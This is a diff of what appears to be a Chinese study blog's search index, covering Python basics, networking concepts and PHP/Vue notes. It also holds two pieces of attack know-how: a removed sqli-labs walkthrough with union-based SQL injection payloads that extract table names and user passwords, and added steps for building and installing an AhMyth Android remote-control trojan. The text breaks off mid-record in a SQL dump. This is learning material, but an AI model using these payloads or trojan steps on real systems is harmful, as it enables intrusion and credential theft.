+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import keyword</span><br><span class="line">&gt;&gt;&gt; keyword.kwlist</span><br><span class="line">[&#x27;False&#x27;, &#x27;None&#x27;, &#x27;True&#x27;, &#x27;and&#x27;, &#x27;as&#x27;, &#x27;assert&#x27;, &#x27;break&#x27;, &#x27;class&#x27;, &#x27;continue&#x27;, &#x27;def&#x27;, &#x27;del&#x27;, &#x27;elif&#x27;, &#x27;else&#x27;, &#x27;except&#x27;, &#x27;finally&#x27;, &#x27;for&#x27;, &#x27;from&#x27;, &#x27;global&#x27;, &#x27;if&#x27;, &#x27;import&#x27;, &#x27;in&#x27;, &#x27;is&#x27;, &#x27;lambda&#x27;, &#x27;nonlocal&#x27;, &#x27;not&#x27;, &#x27;or&#x27;, &#x27;pass&#x27;, &#x27;raise&#x27;, &#x27;return&#x27;, &#x27;try&#x27;, &#x27;while&#x27;, &#x27;with&#x27;, &#x27;yield&#x27;]</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+
+        <h2 id="注释"   >
+          <a href="#注释" class="heading-link"><i class="fas fa-link"></i></a><a href="#注释" class="headerlink" title="注释"></a>注释</h2>
+      <p>Python中单行注释以 <strong>#</strong> 开头，实例如下：</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203163259585.png" alt="image-20231203163259585"></p>
+<p>执行以上代码，输出结果为：</p>
+<p>Hello Python！</p>
+]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正反向shell区别和安卓远控工具AhMyth的使用以及部分网络常识</title>
+    <url>/2023/12/04/text6/</url>
+    <content><![CDATA[
+        <h1 id="正反向shell区别"   >
+          <a href="#正反向shell区别" class="heading-link"><i class="fas fa-link"></i></a><a href="#正反向shell区别" class="headerlink" title="正反向shell区别"></a>正反向shell区别</h1>
+      <p>1.反弹shell：</p>
+<p>木马程序运行在被控制端，被控制端主动连接控制端</p>
+<p>2.正向shell：</p>
+<p>控制端主动发起连接去连接被控制端</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204191035562.png" alt="image-20231204191035562"></p>
+
+        <h1 id="安卓远控工具AhMyth的使用"   >
+          <a href="#安卓远控工具AhMyth的使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#安卓远控工具AhMyth的使用" class="headerlink" title="安卓远控工具AhMyth的使用"></a>安卓远控工具AhMyth的使用</h1>
+      <p>1.生成木马程序</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204191844438.png" alt="image-20231204191844438"></p>
+<p>2.找到木马程序位置</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204191952309.png" alt="image-20231204191952309"></p>
+<p>3.将木马程序放入安卓手机或是模拟器当中安装并运行</p>
+<p>4.点击监听按钮并打开运行按钮</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204192410210.png" alt="image-20231204192410210"></p>
+<p>5.<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204192702390.png" alt="image-20231204192702390"></p>
+
+        <h1 id="部分网络常识"   >
+          <a href="#部分网络常识" class="heading-link"><i class="fas fa-link"></i></a><a href="#部分网络常识" class="headerlink" title="部分网络常识"></a>部分网络常识</h1>
+      <p>1、什么是IP地址<br>IP地址就是给每个连接在Internet上的主机分配的一个32bit地址。按照CP&#x2F;IP协议规定，IP地址用二进制来表示，每个IP地址长32bit，比特换算成字节,就是4个字节。包括主机地址和网络地址两部分。如11000000 10101000 00000001 00000110(192.168.1.6)</p>
+<p>2、什么是子网掩码<br>子网掩码(subnet masking)的功能是告知主机或路由设备，地址的哪一部分是网络号，包括子网的网络号部分，哪一部分是主机号部分。子网掩码使用与IP地址相同的编址格式，即4个8位组的32位长格式。在子网掩码中，网络部分和子网络部分对应的位全为“1”，主机部分对应的位全为“0”通过将子网掩码与IP地址进行“与”操作,可提供所给定的IP地址所属的网络号(包括子网络号)。<br>3.可用的主机IP地址</p>
+<p>去除网关地址和广播地址中间的部分就是可用的主机IP地址。</p>
+<p>4.七层网络模型</p>
+<ul>
+<li><strong>物理层</strong>：</li>
+</ul>
+<p>解决两个硬件之间怎么通信的问题，常见的物理媒介有光纤、电缆、中继器等。它主要定义物理设备标准，如网线的接口类型、光纤的接口类型、各种传输介质的传输速率等。</p>
+<p>它的主要作用是传输比特流（就是由1、0转化为电流强弱来进行传输，到达目的地后在转化为1、0，也就是我们常说的数模转换与模数转换）。这一层的数据叫做比特。</p>
+<ul>
+<li><strong>数据链路层：</strong></li>
+</ul>
+<p>在计算机网络中由于各种干扰的存在，物理链路是不可靠的。该层的主要功能就是：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p>
+<p>它的具体工作是接收来自物理层的位流形式的数据，并封装成帧，传送到上一层；同样，也将来自上层的数据帧，拆装为位流形式的数据转发到物理层。这一层的数据叫做帧。</p>
+<ul>
+<li><strong>网络层：</strong></li>
+</ul>
+<p>计算机网络中如果有多台计算机，怎么找到要发的那台？如果中间有多个节点，怎么选择路径？这就是路由要做的事。</p>
+<p>该层的主要任务就是：通过路由选择算法，为报文（该层的数据单位，由上一层数据打包而来）通过通信子网选择最适当的路径。这一层定义的是IP地址，通过IP地址寻址，所以产生了IP协议。</p>
+<ul>
+<li><strong>传输层：</strong></li>
+</ul>
+<p>当发送大量数据时，很可能会出现丢包的情况，另一台电脑要告诉是否完整接收到全部的包。如果缺了，就告诉丢了哪些包，然后再发一次，直至全部接收为止。</p>
+<p>简单来说，传输层的主要功能就是：监控数据传输服务的质量，保证报文的正确传输。</p>
+<ul>
+<li><strong>会话层：</strong></li>
+</ul>
+<p>虽然已经可以实现给正确的计算机，发送正确的封装过后的信息了。但我们总不可能每次都要调用传输层协议去打包，然后再调用IP协议去找路由，所以我们要建立一个自动收发包，自动寻址的功能。于是会话层出现了：它的作用就是建立和管理应用程序之间的通信。</p>
+<ul>
+<li><strong>表示层：</strong></li>
+</ul>
+<p>表示层负责数据格式的转换，将应用处理的信息转换为适合网络传输的格式，或者将来自下一层的数据转换为上层能处理的格式。</p>
+<ul>
+<li><strong>应用层：</strong></li>
+</ul>
+<p>应用层是计算机用户，以及各种应用程序和网络之间的接口，其功能是直接向用户提供服务，完成用户希望在网络上完成的各种工作。前端同学对应用层肯定是最熟悉的。</p>
+<p>5.常见协议端口号</p>
 <ol>
-<li><strong>单行注释：</strong><ul>
-<li>单行注释以<code>--</code>开头，后面的内容将被视为注释。</li>
-<li>示例：<code>SELECT * FROM users WHERE username = &#39;admin&#39;; -- This is a comment</code></li>
+<li><strong>HTTP (Hypertext Transfer Protocol)</strong><ul>
+<li>默认端口：80</li>
+<li>描述：用于在Web浏览器和Web服务器之间传输超文本的协议。</li>
 </ul>
 </li>
-<li><strong>多行注释：</strong><ul>
-<li>多行注释使用<code>/*</code>开头，以<code>*/</code>结尾，之间的内容将被视为注释。</li>
-<li>示例：</li>
-<li>&#x2F;*<br>   This is a multi-line comment<br>   It can span across multiple lines<br>   SELECT * FROM users WHERE username &#x3D; ‘admin’;<br>*&#x2F;</li>
+<li><strong>HTTPS (Hypertext Transfer Protocol Secure)</strong><ul>
+<li>默认端口：443</li>
+<li>描述：与HTTP类似，但通过TLS&#x2F;SSL加密传输数据，用于安全的Web通信。</li>
+</ul>
+</li>
+<li><strong>FTP (File Transfer Protocol)</strong><ul>
+<li>默认端口：21</li>
+<li>描述：用于在网络上传输文件的标准协议。</li>
+</ul>
+</li>
+<li><strong>SSH (Secure Shell)</strong><ul>
+<li>默认端口：22</li>
+<li>描述：用于通过加密的方式在网络上安全地访问和管理远程计算机。</li>
+</ul>
+</li>
+<li><strong>SMTP (Simple Mail Transfer Protocol)</strong><ul>
+<li>默认端口：25</li>
+<li>描述：用于在网络上传输电子邮件的协议。</li>
+</ul>
+</li>
+<li><strong>POP3 (Post Office Protocol version 3)</strong><ul>
+<li>默认端口：110</li>
+<li>描述：用于从邮件服务器接收电子邮件的协议。</li>
+</ul>
+</li>
+<li><strong>IMAP (Internet Message Access Protocol)</strong><ul>
+<li>默认端口：143</li>
+<li>描述：允许邮件客户端从邮件服务器获取电子邮件的协议。</li>
+</ul>
+</li>
+<li><strong>DNS (Domain Name System)</strong><ul>
+<li>默认端口：53</li>
+<li>描述：将域名转换为IP地址，实现域名解析的协议。</li>
+</ul>
+</li>
+<li><strong>DHCP (Dynamic Host Configuration Protocol)</strong><ul>
+<li>默认端口：67和68</li>
+<li>描述：用于自动分配IP地址和其他网络配置信息给计算机的协议。</li>
+</ul>
+</li>
+<li><strong>SNMP (Simple Network Management Protocol)</strong><ul>
+<li>默认端口：161和162</li>
+<li>描述：用于网络设备之间的管理和监控。</li>
+</ul>
+</li>
+<li><strong>RDP (Remote Desktop Protocol)</strong><ul>
+<li>默认端口：3389</li>
+<li>描述：用于在远程计算机之间进行图形化桌面会话。</li>
+</ul>
+</li>
+<li><strong>NTP (Network Time Protocol)</strong><ul>
+<li>默认端口：123</li>
+<li>描述：用于同步计算机时钟的协议。</li>
 </ul>
 </li>
 </ol>
-<p>7.information _schema库</p>
-<p><code>information_schema</code> 是 MySQL 数据库系统（SQL5开始）中的一个系统数据库，它包含了有关数据库服务器的元数据（metadata元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）和其他信息。这个数据库中的表和视图提供了对数据库服务器状态和配置的访问。</p>
-<p>（1）<strong>SCHEMATA：</strong></p>
-<ul>
-<li>包含所有数据库的信息，比如数据库名称、字符集、排序规则等。</li>
-</ul>
-<p>（2）<strong>TABLES：</strong></p>
-<ul>
-<li>包含所有表的信息，比如表名、所属数据库、表类型、存储引擎等。</li>
-</ul>
-<p>（3）<strong>COLUMNS：</strong></p>
-<ul>
-<li>包含所有表的列信息，如列名、数据类型、是否为主键等。</li>
-</ul>
-<p>（4）<strong>STATISTICS：</strong></p>
-<ul>
-<li>包含表索引的统计信息，如索引名、唯一键信息等。</li>
-</ul>
-<p>（5）<strong>KEY_COLUMN_USAGE：</strong></p>
-<ul>
-<li>包含使用主键或唯一键的外键信息。</li>
-</ul>
-<p>（6）<strong>ROUTINES：</strong></p>
-<ul>
-<li>包含存储过程和函数的信息。</li>
-</ul>
-<p>（7）<strong>VIEWS：</strong></p>
-<ul>
-<li>包含数据库中所有视图的信息。</li>
-</ul>
-<p>（8）<strong>USER_PRIVILEGES、SCHEMA_PRIVILEGES、TABLE_PRIVILEGES：</strong></p>
-<ul>
-<li>包含用户和角色的权限信息。</li>
-</ul>
 ]]></content>
   </entry>
   <entry>
-    <title>sql注入1</title>
-    <url>/2023/12/20/text16/</url>
+    <title>python运算符，数字和字符串</title>
+    <url>/2023/12/04/text7/</url>
     <content><![CDATA[
-        <h1 id="1-MySQL的一些语法知识"   >
-          <a href="#1-MySQL的一些语法知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-MySQL的一些语法知识" class="headerlink" title="1.MySQL的一些语法知识"></a>1.MySQL的一些语法知识</h1>
-      <p>– 选择所有列的所有行<br>SELECT * FROM users;</p>
-<p>– 选择特定列的所有行<br>SELECT username, email FROM users;</p>
-<p>– 添加 WHERE 子句，选择满足条件的行<br>SELECT * FROM users WHERE is_active &#x3D; TRUE;</p>
-<p>– 添加 ORDER BY 子句，按照某列的升序排序<br>SELECT * FROM users ORDER BY birthdate;</p>
-<p>– 添加 ORDER BY 子句，按照某列的降序排序<br>SELECT * FROM users ORDER BY birthdate DESC;</p>
-<p>– 添加 LIMIT 子句，限制返回的行数<br>SELECT * FROM users LIMIT 10;</p>
-<p> –等于条件</p>
-<p>SELECT * FROM users WHERE username &#x3D; ‘test’;</p>
-<p>–UNION 操作符：操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行。</p>
-<p>SELECT city FROM customers UNION  SELECT city FROM suppliers  ORDER BY city;</p>
-<p>–GROUP_CONCAT：组内值连接成字符串的聚合函数。用于在分组的基础上将某个列的值连接成一个字符串。</p>
-<p>SELECT,GROUP_CONCAT(table_name) ,3 FROM information_schema.tables where table_schema&#x3D;database();</p>
-<p>SELECT GROUP_CONCAT(id,”<del>“,username,”</del>“,password) FROM users ;</p>
-<p>–select 123</p>
-<p><code>SELECT 123</code> 是一个简单的查询，它返回一个包含单个值 <code>123</code> 的结果集。<code>1</code> 和 <code>3</code> 是两个固定的常量，它们分别成为查询结果的两个列。它们没有实际的数据库含义，只是作为结果集的一部分而存在。</p>
+        <h1 id="Python算术运算符"   >
+          <a href="#Python算术运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python算术运算符" class="headerlink" title="Python算术运算符"></a>Python算术运算符</h1>
+      <p>运算符 + ：加 - 两个对象相加</p>
+<p>运算符  - ：减 - 得到负数或是一个数减去另一个数</p>
+<p>运算符 * ：乘 - 两个数相乘或是返回一个被重复若干次的字符串</p>
+<p>运算符 &#x2F; ：除 - x 除以 y</p>
+<p>运算符 % ：取模 - 返回除法的余数</p>
+<p>运算符 **：幂 - 返回x的y次幂</p>
+<p>运算符 &#x2F;&#x2F; ：取整除 - 往小的方向取整数</p>
+<p>实例如下：<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231204204846499.png" alt="image-20231204204846499"></p>
 
-        <h1 id="2-SQL注入练习"   >
-          <a href="#2-SQL注入练习" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SQL注入练习" class="headerlink" title="2.SQL注入练习"></a>2.SQL注入练习</h1>
-      <p>1.环境准备数据库和apache服务都要开，安装php5.59版本(版本过高有些内容无法使用)</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202023010.png" alt="image-20231220202023010"></p>
-<p>把sqli文件放在网站根目录，打开网站</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202331397.png" alt="image-20231220202331397"></p>
-<p>点击[Setup&#x2F;reset Database for labs]安装重置数据库文件，会出现如下页面代表能够进行注入练习</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202421678.png" alt="image-20231220202421678"></p>
-<p>安装Hackbar扩展，安装完成后按shift+f12能看到下方有Hackbar</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202855062.png" alt="image-20231220202855062"></p>
-<p>2.点击less1就能进入练习</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220202932975.png" alt="image-20231220202932975"></p>
-<p>load url(加载本页链接可以在链接后面加注入语句)</p>
-<p>excute（执行链接）</p>
-<p>在 SQL 中，<code>--</code> 是注释符号，表示其后的文本将被视为注释而不被执行。当在 SQL 注入攻击中使用 <code>--</code> 时，目的是注释掉原始 SQL 语句的剩余部分，以防止它破坏注入 payload。</p>
-<p>通过？id&#x3D;1’– -注入成功登录如下图</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220203801878.png" alt="image-20231220203801878"></p>
-<p>加入更多的数据查询语句获取更多信息：?id&#x3D;-1’union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database()– -</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220204545237.png" alt="image-20231220204545237"></p>
-<p>?id&#x3D;-1’union select 1,group_concat(id,”<del>“,username,”</del>“,password),3 from users;– -</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231220204634420.png" alt="image-20231220204634420"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>axios引用,html导入vue2,vue2数据绑定</title>
-    <url>/2023/12/18/text14/</url>
-    <content><![CDATA[
-        <h1 id="Axios-引用"   >
-          <a href="#Axios-引用" class="heading-link"><i class="fas fa-link"></i></a><a href="#Axios-引用" class="headerlink" title="Axios 引用"></a>Axios 引用</h1>
-      <p>Axios 是一个基于 Promise 的 HTTP 客户端，用于浏览器和 Node.js。你可以使用 Axios 来发送异步请求，例如从服务器获取数据。</p>
-<p>在 HTML 文件中引入 Axios：</p>
-<!-- 导入 Axios -->
-
-<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-
-<p>可以下载axios文件本地路径引用</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223205753451.png" alt="image-20231223205753451"></p>
-<p>然后，你可以在 JavaScript 中使用 Axios 发送请求。以下是一个简单的例子：</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223205847845.png" alt="image-20231223205847845"></p>
-
-        <h1 id="HTML-导入-Vue-2"   >
-          <a href="#HTML-导入-Vue-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTML-导入-Vue-2" class="headerlink" title="HTML 导入 Vue 2"></a>HTML 导入 Vue 2</h1>
-      <p>Vue.js 是一套构建用户界面的渐进式框架。下面是如何在 HTML 文件中导入 Vue 2：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;!-- 导入 Vue 2 --&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
-
-<p>和axios一样也可以下载到本地进行导用</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223210036072.png" alt="image-20231223210036072"></p>
-
-        <h1 id="Vue-2-数据绑定使用教程"   >
-          <a href="#Vue-2-数据绑定使用教程" class="heading-link"><i class="fas fa-link"></i></a><a href="#Vue-2-数据绑定使用教程" class="headerlink" title="Vue 2 数据绑定使用教程"></a>Vue 2 数据绑定使用教程</h1>
-      <p>Vue 2 提供了强大的数据绑定机制，以下是一个简单的使用实例：</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231223210450633.png" alt="image-20231223210450633"></p>
-<ol>
-<li><strong>el: ‘#app’：</strong> 这里指定了 Vue 实例的挂载点，也就是 HTML 中的 <code>id=&quot;app&quot;</code> 的元素。Vue 将会控制这个元素内部的内容。</li>
-<li><strong>data: function()：</strong> 在 <code>data</code> 中定义了 Vue 实例的数据。<code>visible</code> 控制一个元素或组件的可见性，而 <code>userData</code> 是一个包含用户信息的对象，包括 <code>username</code> 和 <code>password</code>。</li>
-<li><strong>methods：</strong> 这里定义了一些方法，其中包括：<ul>
-<li><strong>login：</strong> 处理用户登录的方法。使用 Axios 发送 POST 请求到 <code>http://127.0.0.1/api1.php</code>，将 <code>this.userData</code>（包含用户输入的用户名和密码）作为请求体发送。然后，根据响应判断是否登录成功，如果成功，重定向到 <code>http://127.0.0.1/index.php</code>，否则调用 <code>open4</code> 方法弹出错误通知。</li>
-<li><strong>open4：</strong> 使用 Element UI 的 <code>$notify</code> 方法弹出一个错误通知，显示错误的标题和消息。</li>
-</ul>
+        <h1 id="Python-数字-Number"   >
+          <a href="#Python-数字-Number" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-数字-Number" class="headerlink" title="Python 数字(Number)"></a>Python 数字(Number)</h1>
+      <ul>
+<li><p><strong>整型(int)</strong> - 通常被称为是整型或整数，是正或负整数，不带小数点。Python3 整型是没有限制大小的，可以当作 Long 类型使用，所以 Python3 没有 Python2 的 Long 类型。布尔(bool)是整型的子类型。</p>
 </li>
-</ol>
-<p>整个 Vue 实例的作用是监听用户的输入，通过 Axios 发送登录请求，并根据返回结果执行相应的操作。这是一个简单的用户登录页面的前端逻辑。注意，这里的实例中使用了 Element UI 的通知组件，确保你已经导入 Element UI 的相关库和样式。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>PHP</title>
-    <url>/2023/12/12/text15/</url>
-    <content><![CDATA[
-        <h1 id="1-PHP简介"   >
-          <a href="#1-PHP简介" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHP简介" class="headerlink" title="1.PHP简介"></a>1.PHP简介</h1>
-      <p>  PHP （全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言,是服务器端脚本语言。PHP 脚本在服务器上执行。</p>
+<li><p><strong>浮点型(float)</strong> - 浮点型由整数部分与小数部分组成，浮点型也可以使用科学计数法表示（2.5e2 &#x3D; 2.5 x 102 &#x3D; 250）</p>
+</li>
+<li><p><strong>复数( (complex))</strong> - 复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。</p>
+
+        <h2 id="Python-数字类型转换"   >
+          <a href="#Python-数字类型转换" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-数字类型转换" class="headerlink" title="Python 数字类型转换"></a>Python 数字类型转换</h2>
+      <p>有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。</p>
 <ul>
-<li><p>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</p>
-</li>
-<li><p>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</p>
-</li>
-<li><p>PHP 文件的默认文件扩展名是 <strong>.php</strong>。</p>
-</li>
-<li><p>PHP 可以生成动态页面内容</p>
-</li>
-<li><p>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</p>
-</li>
-<li><p>PHP 可以收集表单数据</p>
-</li>
-<li><p>PHP 可以发送和接收 cookies</p>
-</li>
-<li><p>PHP 可以添加、删除、修改您的数据库中的数据</p>
-</li>
-<li><p>PHP 可以限制用户访问您的网站上的一些页面</p>
-</li>
-<li><p>PHP 可以加密数据</p>
+<li><strong>int(x)</strong> 将x转换为一个整数。</li>
+<li><strong>float(x)</strong> 将x转换到一个浮点数。</li>
+<li><strong>complex(x)</strong> 将x转换到一个复数，实数部分为 x，虚数部分为 0。</li>
+<li><strong>complex(x, y)</strong> 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。</li>
+</ul>
 </li>
 </ul>
 
-        <h2 id="基本的-PHP-语法"   >
-          <a href="#基本的-PHP-语法" class="heading-link"><i class="fas fa-link"></i></a><a href="#基本的-PHP-语法" class="headerlink" title="基本的 PHP 语法"></a>基本的 PHP 语法</h2>
-      <p>PHP 脚本可以放在文档中的任何位置。</p>
-<p>PHP 脚本以 <strong><?php** 开始，以 **?></strong> 结束：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// PHP 代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+        <h1 id="Python-字符串"   >
+          <a href="#Python-字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python-字符串" class="headerlink" title="Python 字符串"></a>Python 字符串</h1>
+      <p>字符串是 Python 中最常用的数据类型。我们可以使用引号( <strong>‘</strong> 或 <strong>“</strong> )来创建字符串。</p>
+<p>Python 访问子字符串，可以使用方括号 <strong>[]</strong> 来截取字符串，字符串的截取的语法格式如下：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">变量[头下标:尾下标]</span><br></pre></td></tr></table></div></figure>
 
-<p>在 PHP 中，只有一个字符串运算符并置运算符 (.) 用于把两个字符串值连接起来。</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217091106682.png" alt="image-20231217091106682"></p>
-
-        <h2 id="PHP-赋值运算符"   >
-          <a href="#PHP-赋值运算符" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP-赋值运算符" class="headerlink" title="PHP 赋值运算符"></a>PHP 赋值运算符</h2>
-      <p>x &#x3D; y左操作数被设置为右侧表达式的值</p>
-
-        <h1 id="2-用PHP实现数据交互"   >
-          <a href="#2-用PHP实现数据交互" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-用PHP实现数据交互" class="headerlink" title="2.用PHP实现数据交互"></a>2.用PHP实现数据交互</h1>
-      <p>1.打开php study 开启MySQL和apache服务</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231217091152861.png" alt="image-20231217091152861"></p>
-<p>2.打开网站根目录新建index.php和link.php 文件</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203313873.png" alt="image-20231212203313873"></p>
-<p>3.index.php代码</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203456760.png" alt="image-20231212203456760"></p>
-<p>4.link.php代码</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203528339.png" alt="image-20231212203528339"></p>
-<p>5.新建MySQL连接并新建查询</p>
-<p>打开Navicat Premium <img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212203801570.png" alt="image-20231212203801570"></p>
-<p>新建数据库</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212204749503.png" alt="image-20231212204749503"></p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212204910199.png" alt="image-20231212204910199"></p>
-<p>新建查询</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231212205001763.png" alt="image-20231212205001763"></p>
-<p>输入以下代码：</p>
-<p>&#x2F;*<br> Navicat Premium Data Transfer</p>
-<p> Source Server         : 1<br> Source Server Type    : MySQL<br> Source Server Version : 50741<br> Source Host           : localhost:3306<br> Source Schema         : security</p>
-<p> Target Server Type    : MySQL<br> Target Server Version : 50741<br> File Encoding         : 65001</p>
-<p> Date: 12&#x2F;12&#x2F;2023 15:44:36<br>*&#x2F;</p>
-<p>SET NAMES utf8mb4;<br>SET FOREIGN_KEY_CHECKS &#x3D; 0;</p>
-<hr>
-<p>– Table structure for emails</p>
-<hr>
-<p>DROP TABLE IF EXISTS <code>emails</code>;<br>CREATE TABLE <code>emails</code>  (<br>  <code>id</code> int(3) NOT NULL AUTO_INCREMENT,<br>  <code>email_id</code> varchar(30) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,<br>  PRIMARY KEY (<code>id</code>) USING BTREE<br>) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 9 CHARACTER SET &#x3D; gbk COLLATE &#x3D; gbk_chinese_ci ROW_FORMAT &#x3D; Dynamic;</p>
-<hr>
-<p>– Records of emails</p>
-<hr>
-<p>INSERT INTO <code>emails</code> VALUES (1, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#68;&#x75;&#109;&#98;&#64;&#x64;&#x68;&#97;&#x6b;&#107;&#x61;&#110;&#46;&#x63;&#111;&#109;" >&#68;&#x75;&#109;&#98;&#64;&#x64;&#x68;&#97;&#x6b;&#107;&#x61;&#110;&#46;&#x63;&#111;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (2, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#x41;&#x6e;&#103;&#x65;&#108;&#x40;&#x69;&#108;&#111;&#118;&#101;&#117;&#x2e;&#99;&#111;&#x6d;" >&#x41;&#x6e;&#103;&#x65;&#108;&#x40;&#x69;&#108;&#111;&#118;&#101;&#117;&#x2e;&#99;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (3, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#68;&#x75;&#x6d;&#x6d;&#x79;&#64;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#x61;&#x6e;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;" >&#68;&#x75;&#x6d;&#x6d;&#x79;&#64;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#x61;&#x6e;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (4, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#x73;&#101;&#99;&#x75;&#114;&#x65;&#x40;&#100;&#104;&#97;&#x6b;&#x6b;&#x61;&#110;&#46;&#x6c;&#x6f;&#99;&#97;&#108;" >&#x73;&#101;&#99;&#x75;&#114;&#x65;&#x40;&#100;&#104;&#97;&#x6b;&#x6b;&#x61;&#110;&#46;&#x6c;&#x6f;&#99;&#97;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (5, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#115;&#116;&#x75;&#x70;&#105;&#x64;&#64;&#x64;&#104;&#97;&#107;&#x6b;&#97;&#x6e;&#46;&#x6c;&#111;&#99;&#x61;&#108;" >&#115;&#116;&#x75;&#x70;&#105;&#x64;&#64;&#x64;&#104;&#97;&#107;&#x6b;&#97;&#x6e;&#46;&#x6c;&#111;&#99;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (6, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#115;&#x75;&#x70;&#x65;&#x72;&#109;&#x61;&#110;&#64;&#x64;&#104;&#x61;&#107;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#99;&#x61;&#108;" >&#115;&#x75;&#x70;&#x65;&#x72;&#109;&#x61;&#110;&#64;&#x64;&#104;&#x61;&#107;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#99;&#x61;&#108;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>‘);<br>INSERT INTO <code>emails</code> VALUES (7, ‘<span class="exturl"><a class="exturl__link"   href="mailto:&#98;&#x61;&#116;&#109;&#x61;&#110;&#x40;&#x64;&#x68;&#x61;&#x6b;&#x6b;&#97;&#110;&#x2e;&#108;&#111;&#x63;&#x61;&#108;" 